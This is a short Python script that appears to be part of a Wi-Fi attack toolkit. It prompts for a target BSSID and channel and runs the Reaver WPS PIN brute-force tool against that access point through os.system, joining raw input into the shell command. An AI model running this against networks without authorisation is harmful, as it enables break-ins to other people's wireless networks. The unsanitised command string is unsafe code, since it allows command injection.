import argparse
import os
from wps_txt import wps_txt
wps_txt()
def rev():
    print("\n****************************************************************")
    print("\n* Copyright of saai jeshwanth && nithesh, 2021 *")
    print("\n****************************************************************")
    bssid = input("Enter the BSSID :")
    channel = input("Enter the channel no :")
    os.system("./reaver --bssid " + bssid + " --channel " + channel + " --interface wlan0 -vvv --no-associate")

